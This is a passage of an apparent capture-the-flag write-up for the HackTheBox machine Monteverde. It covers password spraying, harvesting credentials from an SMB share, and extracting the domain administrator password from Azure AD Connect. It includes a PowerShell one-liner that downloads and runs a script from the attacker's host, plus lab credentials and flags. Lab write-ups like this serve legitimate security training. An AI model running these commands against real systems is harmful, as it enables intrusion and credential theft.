<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>enum4linux<span class="w"> </span>-a<span class="w"> </span><span class="m">10</span>.10.10.172
</span></code></pre></div><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250624124054.png" /></p>
<h3 id="find-valid-users">Find valid Users</h3>
<p>According the the <code>password policy</code> , we found that <code>Account Lockout Threshold</code> is set to None , so we can attempt <code>password spraying</code> in order to obtain valid credentials without getting locked !!!</p>
<p>windapsearch can also be used to create a list of domain users.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>windapsearch.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-U<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;@&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39; &#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>-d<span class="w"> </span><span class="s1">&#39;@&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>&gt;<span class="w"> </span>users.txt<span class="w"> </span>
</span></code></pre></div><br />
and we collected the valid users as shown below:<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250624124115.png" /></p>
<hr />
<h1 id="foothold">Foothold</h1>
<h2 id="password-spraying">Password spraying</h2>
<p>We have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice., using this <code>wordlist</code>:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/insidetrust/statistically-likely-
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>usernames/master/weak-corporate-passwords/english-basic.txt
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>cat<span class="w"> </span>users.txt<span class="w"> </span>&gt;&gt;<span class="w"> </span>english-basic.txt
</span></code></pre></div></p>
<p>Next, we can use CrackMapExec to perform the password spray, noting that there is no risk in the accounts locking out owning to the absence of an account lockout policy.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-d<span class="w"> </span>megabank<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>english-basic.txt
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Password1<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Welcome1<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Letmein1<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Password123<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Welcome123<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:Letmein123<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>mhope:mhope<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>&lt;SNIP&gt;
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>SABatchJobs:mhope<span class="w"> </span>STATUS_LOGON_FAILURE
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>SMB<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span><span class="m">445</span><span class="w"> </span>MONTEVERDE<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank<span class="se">\\</span>SABatchJobs:SABatchJobs
</span></code></pre></div>
<p>This was successful and we have gained valid domain credentials: <code>SABatchJobs / SABatchJobs</code> .</p>
<h2 id="smb-enumeration-as-sabatchjobs">SMB enumeration as SABatchJobs</h2>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>smbmap<span class="w"> </span>-u<span class="w"> </span>SABatchJobs<span class="w"> </span>-p<span class="w"> </span>SABatchJobs<span class="w"> </span>-d<span class="w"> </span>megabank<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-x<span class="w"> </span>whoami
</span></code></pre></div><br />
This wasn't successful.</p>
<p>We can instead use smbmap to enumerate the remote file shares, which lists our <code>permissions</code>.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>smbmap<span class="w"> </span>-u<span class="w"> </span>SABatchJobs<span class="w">  </span>-p<span class="w"> </span>SABatchJobs<span class="w"> </span>-d<span class="w"> </span>megabank<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.10.172
</span></code></pre></div><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250624124147.png" /></p>
<p>Next, let's <code>crawl</code> the users$ share for potentially interesting files, such as Office documents, text and XML files. (saves time when having large number of shares)<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>smbmap<span class="w"> </span>-u<span class="w"> </span>SABatchJobs<span class="w"> </span>-p<span class="w"> </span>SABatchJobs<span class="w"> </span>-d<span class="w"> </span>megabank<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-A
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="s1">&#39;(xlsx|docx|txt|xml)&#39;</span><span class="w"> </span>-R
</span></code></pre></div></p>
<p>This reveals the file azure.xml , which is automatically downloaded. this file contained a password!<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>&lt;S<span class="w"> </span><span class="nv">N</span><span class="o">=</span><span class="s2">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;
</span></code></pre></div></p>
<h2 id="logging-in-as-mhope">Logging in as mhope</h2>
<p>Let's check if <code>mhope</code> also uses this password in the local AD, as we know this account is in the <code>Remote Management Users</code> group.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.180.160<span class="w"> </span>-u<span class="w"> </span>mhope<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;4n0therD4y@n0th3r$&#39;</span>
</span></code></pre></div><br />
and we are in! , lets grab the flag: <code>c5493bf7722329e80c066b1b2f69a58f</code></p>
<hr />
<h1 id="privesc">Privesc</h1>
<h2 id="checking-users-privileges">Checking user's privileges</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>whoami<span class="w"> </span>/priv
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>----------------------
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">     </span>Enabled
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Enabled
</span></code></pre></div>
<h2 id="checking-group-membership">Checking group membership</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>whoami<span class="w"> </span>/groups
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>GROUP<span class="w"> </span>INFORMATION
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>-----------------
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>Group<span class="w"> </span>Name<span class="w">                                  </span>Type<span class="w">             </span>SID<span class="w">                                          </span><span class="nv">Attributes</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="o">===========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============================================</span><span class="w"> </span><span class="o">==================================================</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>Everyone<span class="w">                                    </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">                                      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>BUILTIN<span class="se">\\</span>Remote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">             </span>Alias<span class="w">            </span>S-1-5-32-580<span class="w">                                 </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>BUILTIN<span class="se">\\</span>Users<span class="w">                               </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w">                                 </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>BUILTIN<span class="se">\\</span>Pre-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w">  </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w">                                 </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\\</span>NETWORK<span class="w">                        </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-2<span class="w">                                      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\\</span>Authenticated<span class="w"> </span>Users<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">                                     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\\</span>This<span class="w"> </span>Organization<span class="w">              </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">                                     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>MEGABANK<span class="se">\\</span>Azure<span class="w"> </span>Admins<span class="w">                       </span>Group<span class="w">            </span>S-1-5-21-391775091-850290835-3566037492-2601<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\\</span>NTLM<span class="w"> </span>Authentication<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">                                  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>Mandatory<span class="w"> </span>Label<span class="se">\\</span>Medium<span class="w"> </span>Plus<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w"> </span>Label<span class="w">            </span>S-1-16-8448
</span></code></pre></div><br />
By inspecting those groups, the one that stands out is the group <code>MEGABANK\\Azure Admins</code></p>
<p>the <code>group membership</code> could be found also by running:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>net<span class="w"> </span>user<span class="w"> </span>mhope
</span></code></pre></div></p>
<h2 id="bloodhound-as-mhope">Bloodhound as mhope</h2>
<p>Lets inspect the AD via bloodhound:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;mhope&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;4n0therD4y@n0th3r$&#39;</span><span class="w">  </span>-d<span class="w"> </span>monteverde.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.180.160<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div></p>
<p>Very interesting, it appears that user <code>MHOPE</code> is member of <code>AZURE_ADMINS</code> group:<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250722192746.png" /></p>
<h2 id="inspecting-the-hosts-program-files">Inspecting the host's Program Files</h2>
<p>since the user is member of <code>AZURE_ADMINS</code> group, lets try to find azure/microsoft related installed programs at <code>program files</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">cd</span><span class="w"> </span>C:<span class="se">\\</span>Progra~1
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>ls
</span></code></pre></div></p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">9</span>:36<span class="w"> </span>PM<span class="w">                </span>Common<span class="w"> </span>Files
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">2</span>:46<span class="w"> </span>PM<span class="w">                </span>internet<span class="w"> </span>explorer
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">2</span>:38<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>Analysis<span class="w"> </span>Services
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">2</span>:51<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>Azure<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>Connect
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">3</span>:37<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>Azure<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>Connect<span class="w"> </span>Upgrader
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">3</span>:02<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>Azure<span class="w"> </span>AD<span class="w"> </span>Connect<span class="w"> </span>Health<span class="w"> </span>Sync<span class="w"> </span>Agent
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">2</span>:53<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>Azure<span class="w"> </span>AD<span class="w"> </span>Sync
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>d-----<span class="w">         </span><span class="m">1</span>/2/2020<span class="w">   </span><span class="m">2</span>:38<span class="w"> </span>PM<span class="w">                </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server
</span></code></pre></div><br />
So what's going on here? how can we move forward?</p>
<h2 id="abusing-azure-ad-connect">Abusing Azure AD connect</h2>
<p>But before we proceed with exploiting it, how does <code>AD connnect</code> work?</p>
<p>I found this article: https://blog.xpnsec.com/azuread-connect-for-redteam/<br />
which also aligns with some of the indicators i found above (like the installed programs for example).</p>
<p>In simple terms, this works due to the fact that <code>Azure AD connect</code> stores creds locally via sql, and if an attacker has local access (in our case is mhope), they can extract creds without the need to communicate with Azure.</p>
<p>In our case, <code>mhope</code> can connect to the local sql db and extract the configuration. Then we can decrypt the configuration and get the creds for the account that does the replication of Active Directory to Azure.</p>
<p>Well, the above appear to be related to <code>Azure-AD-Connect</code>and for this matter, i found this script: <br />
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1</p>
<ul>
<li>The script will attempt to: <ul>
<li>Connect to the ADSync SQL database.</li>
<li>Load the necessary cryptographic library (<code>mcrypt.dll</code>).</li>
<li>Retrieve and decrypt stored credentials (Domain, Username, and Password).</li>
</ul>
</li>
</ul>
<p>First start a web server on our host:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>python<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8888</span>
</span></code></pre></div></p>
<p>Transfer and run the powershell script:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>iex<span class="o">(</span>new-object<span class="w"> </span>net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">&#39;http://10.10.14.202:8888/script.ps1&#39;</span><span class="o">)</span>
</span></code></pre></div></p>
<p>Executing the powershell script on the host:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Attempting<span class="w"> </span>connection:<span class="w"> </span>Data<span class="w"> </span><span class="nv">Source</span><span class="o">=(</span>localdb<span class="o">)</span><span class="se">\.\A</span>DSync<span class="p">;</span>Initial<span class="w"> </span><span class="nv">Catalog</span><span class="o">=</span>ADSync<span class="p">;</span>Integrated<span class="w"> </span><span class="nv">Security</span><span class="o">=</span>True
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Error<span class="w"> </span>connecting<span class="w"> </span>to<span class="w"> </span>SQL<span class="w"> </span>database.<span class="w"> </span>Trying<span class="w"> </span>next...
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>Exception<span class="w"> </span>Message:<span class="w"> </span>A<span class="w"> </span>network-related<span class="w"> </span>or<span class="w"> </span>instance-specific<span class="w"> </span>error<span class="w"> </span>occurred<span class="w"> </span><span class="k">while</span><span class="w"> </span>establishing<span class="w"> </span>a<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>SQL<span class="w"> </span>Server.<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>found<span class="w"> </span>or<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>accessible.<span class="w"> </span>Verify<span class="w"> </span>that<span class="w"> </span>the<span class="w"> </span>instance<span class="w"> </span>name<span class="w"> </span>is<span class="w"> </span>correct<span class="w"> </span>and<span class="w"> </span>that<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>is<span class="w"> </span>configured<span class="w"> </span>to<span class="w"> </span>allow<span class="w"> </span>remote<span class="w"> </span>connections.<span class="w"> </span><span class="o">(</span>provider:<span class="w"> </span>SQL<span class="w"> </span>Network<span class="w"> </span>Interfaces,<span class="w"> </span>error:<span class="w"> </span><span class="m">52</span><span class="w"> </span>-<span class="w"> </span>Unable<span class="w"> </span>to<span class="w"> </span>locate<span class="w"> </span>a<span class="w"> </span>Local<span class="w"> </span>Database<span class="w"> </span>Runtime<span class="w"> </span>installation.<span class="w"> </span>Verify<span class="w"> </span>that<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>Express<span class="w"> </span>is<span class="w"> </span>properly<span class="w"> </span>installed<span class="w"> </span>and<span class="w"> </span>that<span class="w"> </span>the<span class="w"> </span>Local<span class="w"> </span>Database<span class="w"> </span>Runtime<span class="w"> </span>feature<span class="w"> </span>is<span class="w"> </span>enabled.<span class="o">)</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>Attempting<span class="w"> </span>connection:<span class="w"> </span>Data<span class="w"> </span><span class="nv">Source</span><span class="o">=</span>localhost<span class="p">;</span>Initial<span class="w"> </span><span class="nv">Catalog</span><span class="o">=</span>ADSync<span class="p">;</span>Integrated<span class="w"> </span><span class="nv">Security</span><span class="o">=</span>True
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>Connection<span class="w"> </span>successful!
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>Loading<span class="w"> </span>mcrypt.dll<span class="w"> </span>from:<span class="w"> </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\M</span>icrosoft<span class="w"> </span>Azure<span class="w"> </span>AD<span class="w"> </span>Sync<span class="se">\B</span>in<span class="se">\m</span>crypt.dll
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>Domain:<span class="w"> </span>MEGABANK.LOCAL
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>Username:<span class="w"> </span>administrator
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>Password:<span class="w"> </span>d0m@in4dminyeah!
</span></code></pre></div><br />
great! it revealed plaintext password for the <code>administrator</code></p>
<p>finally lets login<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;d0m@in4dminyeah!&#39;</span>
</span></code></pre></div><br />
grabbed root flag <code>8c9b5fd59f2121d6181a4c2d5ff225d2</code></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap <code>scan</code> -&gt; target is a DC, chose <strong>smb</strong> , <code>rpc</code> and <strong>ldap</strong> services to focus on</li>
<li><strong>enumerate</strong> <code>LDAP</code> -&gt; found valid usernames, found one of those (AAD_sth) to indicate that <code>AD Connect</code> is installed on the host. Also from ldap enum i found that one user (mhope) is member of <code>Remote Management Users</code> group, meaning this user can login remotely. Later i <code>collected all the valid users</code>.</li>
<li><strong>enumerate</strong> <code>RPC</code> -&gt; nothing new found</li>
